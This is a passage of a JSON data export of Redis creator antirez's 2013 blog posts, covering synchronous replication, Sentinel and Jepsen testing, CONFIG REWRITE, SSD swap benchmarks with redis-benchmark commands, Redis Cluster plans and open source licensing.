called. 4) As we receive enough ACKs from slaves so that N replicas have an offset already >= to the one we saved, we unblock the client.  Cool right? Synchronous replication almost for free, not affecting the other commands at all, and so forth.  No rollbacks, no fun? ===  There is a problem however, what happens if the timeout is reached and we still did not reached N replicas?  In Redis we don't have rollbacks, and I don't want to add this feature as rollbacks with complex big values are hard to implement, very costly, and will make everything too complex for my current tastes.  So, the write will *anyway* reach the master and a number of slaves < N-1 even if the transaction was not able to honor the requested MINREPLICAS count. However we can notify the user about the number of replicas reached as a first element of the MULTI/EXEC reply. This way the user may rollback manually if he wishes, or he may retry, assuming the write is idempotent\u2026  I wonder if the feature is still useful without rollbacks.  Alternatives ===  There is an alternative: now we are able to sense slaves, so we may implement a much weaker form of check, that could be still very useful in practical systems, that is:      MINREPLICAS    Where I ask Redis to *start* the transaction only if there are at least  slaves connected, with an idle time in the ACK that is less than the specified . This does not guarantee that the write will be propagated to N replicas as there is an obvious window, but we'll be sure that if slaves get disconnected or blocked in some way, after some time (chosen by the user) the writes will no longer be accepted.  What we have now ===  Slave sending ACKs back to our master entered into the 2.8 branch (as it was a bug fix, basically), so the different possibilities are open for the future, but currently I don't feel like it is the right time to implement synchronous replication in Redis without thinking more about the behavior of the feature. However the fact the underlaying mechanism is so simple is tempting... Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-05-27T15:45:08Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5236.7789189, "slug": "exploring-synchronous-replication-in-redis-82", "topics": []}}, {"model": "app.post", "pk": 83, "fields": {"title": "Availability on planet Terah", "link": "http://antirez.com/news/57", "source": 1, "normalized_link": "antirez.com/news/57", "summary": "Terah is a planet far away, where networks never split. They have a single issue with their computer networks, from time to time, single hosts break in a way or the other. Sometimes is a broken power supply, other times a crashed disk, or a software issue completely blocking the system.  The inhabitants of this strange planet use two database systems. One is imported from planet Earth via the Galactic Exchange Program, and is called EDB. The other is produced by engineers from Terah, and is called TDB. The databases are functionally equivalent, but they have different semantics when a network partition happens. While the database from Earth stops accepting writes as long as it is not connected with the majority of the other database nodes, the database from Terah works as long as the majority of the clients can reach at least a database node (incidentally, the author of this story released a similar software project called Sentinel, but this is just a coincidence).  Terah users have setups like the following, with three database nodes and three web servers running clients asking queries to the database nodes (\"D\" denotes a database node, \"C\" a client).                D  D  D                C  C  C  EDB is designed to avoid problems on partitions like this:                D1 \\ D  D                  /               C1 \\ C  C  C1 writing to D1 may result into lost writes if D1 happened to be the master.  However in Terah net splits are not an issue, they invented a solution for all the network partitions back in Galactic Year 712! Still their technology is currently not able to avoid that single hosts fail.  There is a sysop from Terah, Daniel Fucbitz, that always complains about EDB. He does not understand why on the Earth\u2026 oops on the Terah I mean, his company keeps importing EDB, that causes a lot of troubles. He reasons like this: \"If a single node of my network fails, I'm safe with both EDB and TDB, but what happens if one night I'm not lucky and two hosts will fail at the same time?\".  Actually with EDB if two nodes out of the six nodes will fail during the same night, and these nodes happen to be two \"D\" nodes, the system will stop working. The probability for this to happen is (3/6)*(2/5), that is... 20%!  On the other hand TDB will never stop working as long as only two nodes will fail.  And what about three nodes failing at the same time? With EDB this will bring the system down with a probability of 50% (two \"D\" nodes down) + 5% (all clients down), for a total probability of 55%.  While TDB would stop working with a probability of just 5% (all the three DB nodes down), plus 15% (master plus two clients down, no promotion possible), plus 5% (all clients down), for a total of 25%.  Daniel Fucbitz sometimes watches outside his office window, waiting for the third sun to raise, thinking that, yes, on planet Earth is nice to resist to partitions, but it really is not for free at all. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-05-21T15:42:35Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5225.2555189, "slug": "availability-on-planet-terah-83", "topics": []}}, {"model": "app.post", "pk": 84, "fields": {"title": "Reply to Aphyr attack to Sentinel", "link": "http://antirez.com/news/55", "source": 1, "normalized_link": "antirez.com/news/55", "summary": "In a great series of articles Kyle Kingsbury, aka @aphyr on Twitter, attacked a number of data stores:  [1] http://aphyr.com/tags/jepsen  Postgress, Redis Sentinel, MongoDB, and Riak are audited to find what happens during network partitions and how these systems can provide the claimed guarantees.  Redis is attacked here: http://aphyr.com/posts/283-call-me-maybe-redis  I said that Kyle \"attacked\" the systems on purpose, as I see a parallel with the world of computer security here, it is really a good idea to move this paradigm to the database world, to show failure modes of systems against the claims of vendors. Similarly to what happens in the security world the vendor may take the right steps to fix the system when possible, or simply the user base will be able to recognize that under certain circumstances something bad is going to happen with your data.  Another awesome thing in the Kyle's series is the educational tone, almost nothing is given for granted and the articles can be read by people that never cared about databases to distributed systems experts. Well done!  In this blog post I'll try to address the points Kyle made about Redis Sentinel, that's the system he tested.  Sentinel goals ===  In the post Kyle writes \"What are the consistency and availability properties of Sentinel?\". Probably this is the only flaw I saw in this article.  Redis Sentinel is a distributed *monitoring* system, with support for automatic failover. It is in no way a shell that wraps N Redis instances into a distributed data store. So if you consider the properties of the \"Redis data store + Sentinel\", what you'll find is the properties of any Redis master-slave system where there is an external component that can promote a slave into a master under certain circumstances, but has limited abilities to change the fundamental fact that Redis, without Redis Cluster, is not a distributed data store.  However it is also true that Redis Sentinel also acts as a configuration device, and even with the help of clients, so as a whole it is a complex system with given behavior that's worth analyzing.  What I'm saying here is that just the goal of the system is:  1) To promote a slave into a master if the master fails. 2) To do so in a reliable way.  All the stress here is in the point \"2\", that is, the fact that sentinels can be placed outside the master-slaves system makes the user able to decide a more objective point of view to declare the master as failing.  And another property is that Sentinel is distributed enough so that single sentinels can fail at any time, including during the failover process, and the process will still continue unaffected as long as it is still possible to reach the majority.  I think that the goal of Redis Sentinel is pretty clear so I'm surprised (not in a negative way) that it was tested creating a partition where the old master is in the minority together with a client, and then show that the client was still able to write to the old master. I honestly don't think any user expects something different from Redis Sentinel. That said, I'll ignore this fact from now on and reply to the different parts of the article as there is important information anyway IMHO, especially since, after all, Redis Sentinel + N Redis instances + M Clients is \"A System\", so Kyle analysis makes sense even under my above assumptions.  Partitioning the cluster ===  Ok I just made clear enough that there is no such goal in Sentinel to turn N Redis instances into a distributed store, so basically what happens is that:  1) Clients in the majority side will be able to continue to write once the failover is complete. 2) Clients in the minority side may possibly write to the old master, and when the network is ok again, the master will be turned into a slave of the new master, so all the writes in the minority side are lost forever.  So you can say, ok, Sentinel has a limited scope, but could you add a feature so that when the master feels in the minority it no longer accept writes? I don't think it's a good idea. What it means to be in the minority for a Redis master monitored by Sentinels (especially given that Redis and Sentinel are completely separated systems)?  Do you want your Redis master stopping to accept writes when it is no longer able to replicate to its slaves? Or do you want it when enough Sentinels are down? My guess is that given the goals of the system, instead of going down the road of stopping the master for possibly harmless conditions (or not as bad as a stopped master), just use the fact that Sentinel is very configurable: place your Sentinels and set your quorum so that you are defensive enough against partitions. This way the system will activate only when the issue is really the master node down, not a network problem. Fear data loss and partitions? Have 10 Linux boxes? Put a Sentinel in every box and set quorum to 8.  Just to be clear, the criticism is a good one, and it shows how Sentinel is not good to handle complex net splits with minimal data loss. Just this was never the goal, and what users were doing with their home-made scripts to handle failover was in the 99% of cases much worse than what Sentinel achieve as failure detection and handling of the failover process.  Redis consensus protocol ===  Another criticism is that the Sentinel protocol is complex to analyze, and even requires some help from the client.  It is true that is a complex protocol because while the agreement is vaguely byzantine looking, actually is a dynamic process without an ordered number of steps to reach an agreement. Simply the state about different things like if a node is failing or not, and who should perform the promotion, is broadcasted continuously among sentinels.  A majority is basically reached when the state of N nodes (with N >= quorum) that is no older than a given number of seconds, agrees about something.  Both failure detection and the election of the sentinel doing the failover are reasonable candidates for this informal protocol since the information every sentinel has about the availability of a given instance or sentinel itself is a moving target itself. Also the rest of the system is designed to be resistant against errors in the agreement protocol (the first sentinel recognizing a failure will force all the others to recognized it, and the failover process is auto-detected by the other instances that can monitor the elected slave. Also care is taken to avoid a protocol that is fragile against multiple sentinels doing the failover at the same time if this may ever happen).  Kyle notes that there is the concept of TILT so that Sentinel is sensible to clock skew and desynchronization. Actually there is no explicit use of absolute time in the protocol nor Sentinels are required to have a synchronized clock at all.  Just to clarify TILT is a special mode that is used when Sentinel detects its internal state is corrupted in two ways: either the system clock jumped in the past, so a Sentinel can no longer trust its *internal* state, or the clock appears to have jumped in the future, that means, the sentinel process for some reason was blocked for a long time. In both cases such a sentinel will enter TILT mode so it will stop acting for some time, until the state is believed to be already reliable. TILT is basically not part of the Sentinel protocol, but just a programming trick to make a system more reliable in presence of strange behaviors from the operating system.   Involvement of the clients ===  In Sentinel clients involvement is not mandatory since you may want to run a script during a failover so that configuration will change in some permanent way.  However the suggested mode of operation is to use clients that refresh the information when a reconnection is needed (actually we are going into the direction of forcing a periodic state refresh, and when Sentinel demotes a reappearing old master we'll send a command to the old master that forces all the connections to be dropped, this improves the reliability of the system in a considerable way).  So in the article I can read:  * Sentinels could promote a node no clients can see * Sentinels could demote the only node clients can actually reach * \u2026  And so forth. Again here the point is, Sentinel is designed exactly to let you pick your tradeoffs from that point of view, and the documentation suggests that your Sentinels stay in the same machines where you run your clients, web servers, and so forth, not into the Redis server nodes.  Because indeed almost always the point of view you want to say something is \"down\" is the point of view of the client.  Broken things Kyle did not investigated ===  Kyle did a great work to show you want you should *not* expect from Sentinel.  There is much more we are to fix, because HA is a complex problem in master -> slave systems. For instance the current version of Sentinel does not handle well enough reconfigured instances that reboot with an old config: sometimes you may just lost a slave that is ignored by Sentinels.  This and other problems are still a work in progress, and what I'm trying to provide with Redis Sentinel is a monitoring and failover solution that does not suck so much, as in, you can select the point of view of what \"down\" means, both topologically and as a quorum, and you can stay sure that a few sentinels going away will not break your failover process.  Redis Cluster ===  Redis Cluster is a system much more similar to what Kyle had in mind when testing Sentinel. For instance after a split the side with the minority of slaves will stop accepting writes so while there is always a window for data loss, there is in the big picture of things always only a single part of the network that accepts writes.  I invite you to read the other articles in the Kyle's series, they are very informative.  Thank you Kyle, please keep attacking databases. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-05-19T15:42:06Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5221.4148744, "slug": "reply-to-aphyr-attack-to-sentinel-84", "topics": []}}, {"model": "app.post", "pk": 85, "fields": {"title": "Redis configuration rewriting", "link": "http://antirez.com/news/54", "source": 1, "normalized_link": "antirez.com/news/54", "summary": "Lately I'm trying to push forward Redis 2.8 enough to reach the feature freeze and release it as a stable release as soon as possible. Redis 2.8 will not contain Redis Cluster, and its implementation of Redis Sentinel is the same as 2.6 and unstable branches, (Sentinel is taken mostly in sync in all the branches being fundamentally a different project using Redis just as framework).  However there are many new interesting features in Redis 2.8 that are back ported from the unstable branch. Basically 2.8 it's our usual \"in the middle\" release, like 2.4 was: waiting for Redis 3.0 that will feature Redis Cluster (we have great progresses about it! See https://vimeo.com/63672368), we'll have a 2.8 release with everything that is ready to be released into the unstable branch. The goal is of course to put more things in the hands of users ASAP.  The big three new entries into Redis 2.8 are replication partial resynchronizations (already covered in this blog), keyspace events notifications via Pub/Sub, and finally CONFIG REWRITE, a feature I just finished to implement (you can find it in the config-rewrite branch at Github). The post explains what CONFIG REWRITE is.  An inverted workflow ===  Almost every unix daemon works like that:  1) You have a configuration file. 2) When you need to hack the configuration, you modify it and either restart the daemon, or send it a signal to reload the config.  It's been this way forever, but with Redis I took a different path since the start: as long as I understood people created \"farms\" of Redis servers either to provision them on-demand, or for internal usage where a big number of Redis servers are used, I really wanted to provide a different paradigm that was more \"network oriented\".  This is why I introduced the CONFIG command, with its sub commands GET and SET. At the start the ability of CONFIG was pretty basic, but now you can reconfigure almost every aspect of Redis on the fly, just sending commands to the server. This is extreme enough you can change persistence type when an instance is running. For example just typing:      CONFIG SET appendonly yes  Will switch on the Append Only File, will start a rewrite process to create the first AOF, and so forth. Similarly it is possible to alter from replication to memory limits and policy while the server is running, just interacting with the server with normal commands without any \"hook\" inside the operating system running Redis.  The symmetrical command CONFIG GET is used to query the configuration. Some users are more conservative in how they handle their servers and may want to always touch the configurations manually, but my idea was that the two commands provided quite a powerful system to handle a large number of instances in a scriptable way without the use of additional software layers, and avoiding restarts of the server that are costly, especially in the case of an in memory database.  However there was a major issue, after you modified an important configuration parameter with CONFIG SET, later you had to report the change into the redis.conf file manually, so that after the restart Redis would use the new config. As you can guess this was a huge limitation, basically the CONFIG API was only useful to hack the config live and avoid a reboot, but manual intervention or some other software layer to handle the configuration of your servers was needed anyway.  So the idea to solve this issue was to add as soon as possible a new command, CONFIG REWRITE, that would rewrite the Redis configuration to report the changes in memory. So the new work flow would be like that:      CONFIG SET appendonly yes     CONFIG REWRITE  However I was trying to do a complete refactoring of the config.c file in order to implement this feature easily, but this was the best recipe to delay the feature forever\u2026 Finally I decided to implement it before the 2.8 release, without waiting for a refactoring, but implementing the new feature in a way that is refactor-friendly. So basically, we finally have it!  I believe that now that CONFIG REWRITE somewhat completes the triad of the configuration API, users will greatly benefit from that, both in the case of small users that will do configuration changes from redis-cli in a very reliable way, without a restart, without the possibility of configuration errors in redis.conf, and for big users of course where scripting a large farm of Redis instances can be very useful.  Before to continue: If you want to play with config rewrite, clone the config-rewrite branch at Github (but the feature will be merged into 2.8 and unstable soon), and play with it.  A gentle rewrite ===  Rewriting a configuration file is harder than it seems at first. Actually to do a brutal rewrite is trivial, you just write every configuration parameter with the current value in the new file, and you are done, but this has a number of side effects:  1) User comments and overall redis.conf structure go away, lost forever. 2) You get a number of things set explicitly to its default value. 3) After a server upgrade, because of \"2\", maybe you'll run an old default value that now changed.  So CONFIG REWRITE tries to follow a set of rules to make the rewriting more gentle, touching only the minimum possible, and preserving everything else.  This is how it works:  1) Comments are always preserved. 2) If an option was already present in the old redis.conf, the same line is used for the same option in the new file. 3) If an option was not present and is set at its default value, it is not added. 4) If an option was not present, but the new value is no longer its default, the option is appended at the end of the file. 5) All the no longer useful lines in the old configuration file are blanked (for example if there were three \"save\" options, but only two are used in the new config).  However if the configuration file for some reason no longer exists, CONFIG REWRITE will create it from scratch. The rules followed are the above anyway, just assuming an empty old configuration file, so the effect is to just produce a configuration file with every option not set to the default value.  An example ===  Just to make everything a bit more real, that's an example.  I start Redis with the following configuration file:  --- # This is a comment save 3600 10 save 60 10000  # Hello world dir . ---  After a CONFIG REWRITE without changing any parameter what I see is:  --- # This is a comment save 3600 10 save 60 10000  # Hello world dir \"/Users/antirez/hack/redis/src\" ---  As you can see the only difference is that \"dir\" was turned into an absolute path in that case, only because it was not already. The path is also quoted inside \"\" as certain options are rewritten in order to support special characters.  At this point I use the following commands:  redis 127.0.0.1:6379> config set appendonly yes OK redis 127.0.0.1:6379> config set maxmemory 10000000 OK redis 127.0.0.1:6379> config rewrite OK  Now the configuration file looks like that:  --- # This is a comment save 3600 10 save 60 10000  # Hello world dir \"/Users/antirez/hack/redis/src\"  # Generated by CONFIG REWRITE maxmemory 10000000 appendonly yes ---  As you can see new configurations are appended at the end.  Finally I make a change that requires deleting some previous line:  redis 127.0.0.1:6379> config set save \"\" OK redis 127.0.0.1:6379> config rewrite OK  The new config file is the following:  --- # This is a comment  # Hello world dir \"/Users/antirez/hack/redis/src\"  # Generated by CONFIG REWRITE maxmemory 10000000 appendonly yes ---  Comments are preserved but multiple blank lines are squeezed to a single one.  Thanks for reading! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-05-13T15:41:46Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5209.89443, "slug": "redis-configuration-rewriting-85", "topics": []}}, {"model": "app.post", "pk": 86, "fields": {"title": "Hacking Italia", "link": "http://antirez.com/news/53", "source": 1, "normalized_link": "antirez.com/news/53", "summary": "Questo post ha lo scopo di presentare alla comunita' italiana interessata ai temi della programmazione e delle startup un progetto nato attorno ad un paio di birre: \"Hacking Italia\", che trovate all'indirizzo http://hackingitalia.com  Hacking Italia e' un sito di \"social news\", molto simile ad Hacker News, il celebre collettore di news per hacker di YCombinator. A che serve un sito italiano, e in italiano se c'e' gia' molto di piu' e di meglio nel panorama internazionale? A mettere assieme una massa critica di persone \"giuste\" in Italia.  Mettere assieme le persone significa molto, specialmente in un paese stretto e lungo 1500 chilometri, dove le occasioni di incontri tra programmatori e startupper sono ridotte, i finanziatori nascosti in chissa' quali palazzi, inaccessibili ai piu'. Sono 15 anni che faccio questo mestiere e conosco pochissime persone in Italia, e una quantita' in tutto il resto del mondo... e dire che non e' certo un paese dove manca la passione per il codice e per l'innovazione, come la storia ci ricorda.  E allora mettersi assieme significa, tanto per iniziare, avere gia' una piccola vetrina di persone a cui presentare la tua idea. Significa anche discutere assieme dei temi che non sono di nessun interesse per chi non opera nel nostro territorio, come le forme societarie e i mille problemi burocratici a cui ci tocca far fronte. Inoltre mentre probabilmente creare un clone dei servizi affermati globalmente, come Youtube o Gmail, per il mercato italiano, e' una operazione senza alcun merito, questo sono significa che non esistono delle startup che potrebbero essere di grande successo e che abbiano come target il territorio italiano: news, ristorazione, business to business, medicina... ci sono infiniti temi che si possono trattare facendo leva sul fatto che le economie di scala consentono, a chi opera in Italia, di fare meglio per gli italiani.  Per cui se questi temi sono importanti anche per voi, spargete la voce, registratevi, e date il vostro contributo.  Un po' di background per finire. Il progetto e' nato grazie al fatto che da qualche settimana, qui a Catania, abbiamo iniziato ad incontrarci tra programmatori. Prendiamo una birra, e parliamo di hacking, e non solo. Non avrei mai pensato che questo potesse accadere a dire il vero, parlare di cose davvero tecniche (e interessanti) a pochi chilometri da casa mia. E parlando un po' e' nata questa idea... dunque grazie ad Angelo, Fabio, Geert, Giuseppe, Marcello, e arrivederci sia al pub che sul nuovo sito! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-05-06T15:41:23Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5196.4539189, "slug": "hacking-italia-86", "topics": []}}, {"model": "app.post", "pk": 87, "fields": {"title": "Redis with an SSD swap, not what you want", "link": "http://antirez.com/news/52", "source": 1, "normalized_link": "antirez.com/news/52", "summary": "Hello! As promised today I did some SSD testing.  The setup: a Linux box with 24 GB of RAM, with two disks.  A) A spinning disk. b) An SSD (Intel 320 series).  The idea is, what happens if I set the SSD disk partition as a swap partition and fill Redis with a dataset larger than RAM? It is a lot of time I want to do this test, especially now that Redis focus is only on RAM and I abandoned the idea of targeting disk for a number of reasons.  I already guessed that the SSD swap setup would perform in a bad way, but I was not expecting it was *so bad*.  Before testing this setup, let's start testing Redis in memory with in the same box with a 10 GB data set.  IN MEMORY TEST ===  To start I filled the instance with:  ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo  Write load in this way is very high, more than half million SET commands processed per second using a single core:  instantaneous_ops_per_sec:629782  This is possible because we using a pipeline of 32 commands per time (see -P 32), so it is possible to limit the number of sys calls involved in the processing of commands, and the network latency component as well.  After a few minutes I reached 10 GB of memory used by Redis, so I tried to save the DB while still sending the same write load to the server to see what the additional memory usage due to copy on write would be in such a stress conditions:  [31930] 07 Mar 12:06:48.682 * RDB: 6991 MB of memory used by copy-on-write  almost 7GB of additional memory used, that is 70% more memory. Note that this is an interesting value since it is exactly the worst case scenario you can get with Redis:  1) Peak load of more than 0.6 million writes per second. 2) Writes are completely distributed across the data set, there is no working set in this case, all the DB is the working set.  But given the enormous pressure on copy on write exercised by this workload, what is the write performance in this case while the system is saving? To find the value I started a BGSAVE and at the same time started the benchmark again:  $ redis-cli bgsave; ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo Background saving started ^Ct key:rand:000000000000 foo: 251470.34  250k ops/sec was the lower number I was able to get, as once copy on write starts to happen, there is less and less copy on write happening every second, and the benchmark soon returns to 0.6 million ops per second. The number of keys was in the order of 100 million here.  Basically the result of this test is, with real hardware and persisting to a normal spinning disk, Redis performs very well as long as you have enough RAM for your data, and for the additional memory used while saving. No big news so far.  SSD SWAP TEST ===  For the SSD test we still use the spinning disk attached to the system in order to persist, so that the SSD is just working as a swap partition.  To fill the instance even more I just started again redis-benchmark with the same command line, since with the specific parameters, if running forever, it would set 1 billion keys, that's enough :-)  Since the instance has 24 GB of physical RAM, for the test to be meaningful I wanted to add enough data to reach 50 GB of used memory. In order to speedup the process of filling the instance I disabled persistence for some time using:  CONFIG SET SAVE \"\"  While filling the instance, at some point I started a BGSAVE to force some more swapping. Then when the BGSAVE finished, I started the benchmark again:  $ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo ^Ct key:rand:000000000000 foo: 1034.16  As you can see the results were very bad initially, probably the main hash table ended swapped. After some time it started to perform in a decent way again:  $ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo ^Ct key:rand:000000000000 foo: 116057.11  I was able to stop and restart the benchmark multiple times and still get decent performances on restarts, as long I was not saving at the same time. However performances continued to be very erratic, jumping from 200k to 50k sets per second.  \u2026. and after 10 minutes \u2026  It only went from 23 GB of memory used to 24 GB, with 2 GB of data set swapped on disk.  As soon as it started to have a few GB swapped performances started to be simply too poor to be acceptable.  I then tried with reads:  $ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 get key:rand:000000000000 ^Ct key:rand:000000000000 foo: 28934.12  Same issue, 30k ops per second both for GET and SET, and *a lot* of swap activity at the same time. What's worse is that the system was pretty unresponsive as a whole at this point.  At this point I stopped the test, the system was slow enough that filling it even more would require a lot of time, and as more data was swapped performances started to get worse.  WHAT HAPPENS? ===  What happens is simple, Redis is designed to work in an environment where random access of memory is very fast. Hash tables, and the way Redis objects are allocated is all based on this concept.  Now let's give a look at the SSD 320 disk specifications:  Random write (100% Span) -> 400 IOPS Random write (8GB Span) -> 23000 IOPS  Basically what happens is that at some point Redis starts to force the OS to move memory pages between RAM and swap at *every* operation performed, since we are accessed keys at random, and there are no more spare pages.  CONCLUSION ===  Redis is completely useless in this way. Systems designed to work in this kind of setups like Twitter fatcache or the recently announced Facebook McDipper need to be SSD-aware, and can probably work reasonably only when a simple GET/SET/DEL model is used.  I also expect that the pathological case for this systems, that is evenly distributed writes with big span, is not going to be excellent because of current SSD disk limits, but that's exactly the case Redis is trying to solve for most users.  The freedom Redis gets from the use of memory allows us to serve much more complex tasks at very good peak performance and with minimal system complexity and underlying assumptions.  TL;DR: the outcome of this test was expected and Redis is an in-memory system :-) Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-03-06T15:41:02Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5079.3334522, "slug": "redis-with-an-ssd-swap-not-what-you-want-87", "topics": []}}, {"model": "app.post", "pk": 88, "fields": {"title": "Log driven programming is a real productivity booster.", "link": "http://antirez.com/news/51", "source": 1, "normalized_link": "antirez.com/news/51", "summary": "One thing, more than everything else, keeps me focused while programming: never interrupt the flow.  If you ever wrote some complex piece of code you know what happens after some time: your mental model of the software starts to be very complex with different ideas nested inside other ideas, like the structure of your program is, after all.  So while you are writing this piece of code, you realize that because of it you need to do that other change. Something like \"I'm freeing this object here, but it's connected to this two other objects and I need to do this and that in order to ensure consistent state\".  The worst thing you can do is to interrupt what you are currently doing in order to fix the new problem. Instead just write freeMyObject() and don't care, but at the same time, open a different editor, and write:  * freeMyObject() should make sure to remove references from XYZ bla bla bla.  When you finished with the current function / task / whatever, re-read your notes and implement what is possible to implement. You'll get new ideas or new things to fix, use the same trick again, and log your ideas without interrupting the flow.  In this way parts of the program make sense, individually. You can address the other parts later. This is 100 times better than nested-thinking, where you need to stop, do another task, and return back. Humans don't have stack frames.  For my log I use Evernote because the log needs to have one characteristic: No save, No filenames, Nothing more than typing something. Evernote will save it for you, and is a different physical interface compared to your code editor. This in my experience improves the 2 seconds switch you need to log.  After some time your log starts to be long. When you realize most of it feels old as your code base and your idea of the system evolved, trace a like like this:  -------------------- OLD STUFF ---------------------  And continue logging again. From time to time however, re-read your old logs. You may find some gems. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-02-26T15:40:42Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5063.9730078, "slug": "log-driven-programming-is-a-real-productivity-booster-88", "topics": []}}, {"model": "app.post", "pk": 89, "fields": {"title": "An idea for Twitter", "link": "http://antirez.com/news/50", "source": 1, "normalized_link": "antirez.com/news/50", "summary": "After the \"sexism gate\" I started to use my Twitter account only for private stuff in order to protect the image of Redis and/from my freedom to say whatever I want. It did not worked actually since the reality is that people continue to address you with at-messages about Redis stuff.  But the good outcome is that now I created a @redisfeed account that I use in order to provide a stream of information to Redis users that are not interested in my personal tweets  not related to Redis. Anyway when I say some important thing regarding Redis with my personal account, I just retweet in the other side, so this is a good setup.  However... I wonder if Twitter is missing an opportunity for providing a better service here, that is, the concept of \"channels\".  Basically I'm a single person, but I've multiple logical streams of informations:  1) I tweet about Redis. 2) I tweet about other technological stuff. 3) I say things related to my personal life. 4) Sometimes I tweet things in Italian language.  Maybe there are followers interested in just one or a few of these logical channels, so it would be cool for Twitter users to be able to follow only a subset of the channels of another twitter user.  Probably this breaks the idea of simplicity of Twitter, but I'm pretty sure there are ways to present such a feature in an interesting way: by default all users have a single channel and following them in general means to follow all the channels, it is only as a refinement and only if the user created multiple channels that you can fine-tune what you follow and what not, so basically the added complexity would be minimal.  I'm pretty sure that now that Twitter is designed with the average user in mind such a feature will never be implemented actually, without to mention that this may add some serious technological complexity to their infrastructure, but maybe in the long run such a feature may be more vital than we believe now because it is pretty related to the \"information diet\" concept. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-02-26T15:40:24Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5063.9726078, "slug": "an-idea-for-twitter-89", "topics": []}}, {"model": "app.post", "pk": 90, "fields": {"title": "News about Redis: 2.8 is shaping, I'm back on Cluster.", "link": "http://antirez.com/news/49", "source": 1, "normalized_link": "antirez.com/news/49", "summary": "This is a very busy moment for Redis because the new year started in a very interesting way:  1) I finished the Partial Resynchronization patch (aka PSYNC) and merged it into the unstable and 2.8 branch. You can read more about it here: http://antirez.com/news/47 2) We finally have keyspace changes notifications: http://redis.io/topics/notifications  Everything is already merged into our development branches, so the deal is closed, and Redis 2.8 will include both the features.  I'm especially super excited about PSYNC, as this is a not-feature, simply you don't have to deal with it, the only change is that slaves work A LOT better. I love adding stuff that is transparent for users, just making the system better and more robust.  What I'm even more excited about is the fact that now that PSYNC and notifications are into 2.8, I'll mostly freeze it and can finally focus on Redis Cluster.  It's  a lot of time that I wait to finish Redis Cluster, now it's the right time because Redis 2.6 is out and seems very stable, people are just starting to really discovering it and the ways it is possible to use Lua scripting and the advanced bit operations to do more. Redis 2.8 is already consolidated as release, but requires a long beta stage because we touched the inner working of replication. So I can pause other incremental improvements for a bit to focus on Redis Cluster. Basically my plan is to work mostly to cluster as long as it does not reach beta quality, and for beta quality I mean, something that brave users may put into production.  Today I already started to commit new stuff to Cluster code. Hash slots are now 16384 instead of 4096, this means that we are now targeting clusters of ~1000 nodes. This decision was taken because there are big Redis users with already a few hundred of nodes running.  Another change is that probably, in order to ship Cluster ASAP, in the first stage I plan to use Redis Sentinel in order to failover master nodes (but Sentinel will be able to accept as configuration a list of addresses of cluster nodes and will fetch all the other nodes using CLUSTER NODES).  So basically the first version of Redis Cluster to hit a stable release will have the following features:  1) Automatic partition of key space. 2) Hot resharding. 3) Only single key operations supported.  The above is already implemented but there is more work to do in order to move all this from alpha to beta quality. There is also a significant amount of work to do in library clients, and I'll try to provide an initial reference implementation based on redis-rb (actually I hope to just write a wrapper library).  Note that \"3\" is here to stay, there are currently no plans to extend Cluster to anything requiring keys to be moved back on forth magically. But MIGRATE COPY will provide a way for users to move keys into spare instances to perform computations with multiple keys.  Of course all this modulo critical bugs. If there is something odd with stable releases I'll stop everything and fix it as usually :-) Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-02-13T15:40:06Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5039.0122078, "slug": "news-about-redis-28-is-shaping-im-back-on-cluster-90", "topics": []}}, {"model": "app.post", "pk": 91, "fields": {"title": "A few thoughts about Open Source Software", "link": "http://antirez.com/news/48", "source": 1, "normalized_link": "antirez.com/news/48", "summary": "For a decade and half I contributed to open source regularly, and still it is relatively rare that I stop to think a bit more about what this means for me. Probably it is just because I like to write code, so this is how I use my time: writing code instead of thinking about what this means\u2026 however lately I'm starting to have a few recurring ideas about open source, its relationship with the IT industry, and my interpretation of what OSS is, for me, as a developer.  First of all, open source for me is not a way to contribute to the free software movement, but to contribute to humanity. This means a lot of things, for instance I don't care about what people do with my code, nor if they'll release back their modifications. I simply want people to use my code in one way or the other.  Especially I want people to have fun, learn new stuff, and *make money* with my code. For me other people making money out of something I wrote is not something that I lost, it is something that I gained.  1) I'm having a bigger effect in the world if somebody can pay the bills using my code. 2) If there are N subjects making money with my code, maybe they will be happy to share some of this money with me, or will be more willing to hire me. 3) I can be myself one of the subjects making money with my code, and with other open source software code.  For all this reasons my license of choice is the BSD licensed, that is the perfect incarnation of \"do whatever you want\" as a license.  However clearly not everybody thinks alike, and many programmers contributing to open source don't like the idea that other people can take the source code and create business out of it as a commercial product that is not released under the same license. To me instead many of the rules that you need to follow to use the GPL license are a practical barrier reducing the actual freedom of what people can do with the source code. Also I've the feeling that receiving back contributions it is not too much related to the license: if something is useful people will contribute back in some way, because maintaining forks is not great. The real gold is where development happens. Unfixed, not evolved code bases are worth zero. If you as an open source developer can provide value, other parties will be more 